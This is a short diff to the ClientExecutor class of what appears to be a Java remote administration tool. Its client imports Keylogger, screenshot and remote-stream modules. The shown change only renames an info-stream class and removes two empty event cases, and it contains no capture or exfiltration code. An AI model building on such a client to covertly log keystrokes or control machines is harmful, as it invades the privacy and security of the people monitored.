@@ -37,7 +37,6 @@ import com.subterranean_security.crimson.client.Client;
 import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.modules.Power;
 import com.subterranean_security.crimson.client.modules.QuickScreenshot;
-import com.subterranean_security.crimson.client.net.stream.CInfoSlave;
 import com.subterranean_security.crimson.client.store.ConfigStore;
 import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
 import com.subterranean_security.crimson.core.misc.HCP;
@@ -53,6 +52,7 @@ import com.subterranean_security.crimson.core.store.LcvidStore;
 import com.subterranean_security.crimson.core.store.NetworkStore;
 import com.subterranean_security.crimson.core.stream.Stream;
 import com.subterranean_security.crimson.core.stream.StreamStore;
+import com.subterranean_security.crimson.core.stream.info.InfoSlave;
 import com.subterranean_security.crimson.core.stream.remote.RemoteSlave;
 import com.subterranean_security.crimson.core.util.CryptoUtil;
 import com.subterranean_security.crimson.core.util.FileUtil;
@@ -118,12 +118,8 @@ public class ClientExecutor extends BasicExecutor {
 						break;
 					case EV_PROFILE_DELTA:
 						break;
-					case EV_SERVER_PROFILE_DELTA:
-						break;
 					case EV_STREAM_DATA:
 						ev_stream_data(m);
-						break;
-					case EV_VIEWER_PROFILE_DELTA:
 						break;
 					case MI_AUTH_REQUEST:
 						break;
@@ -499,7 +495,7 @@ public class ClientExecutor extends BasicExecutor {
 	private void stream_start_ev(Message m) {
 		Param p = m.getMiStreamStart().getParam();
 		if (p.hasInfoParam()) {
-			StreamStore.addStream(new CInfoSlave(p));
+			StreamStore.addStream(new InfoSlave(p));
 		}
 		if (p.hasRemoteParam()) {
 			StreamStore.addStream(new RemoteSlave(p));
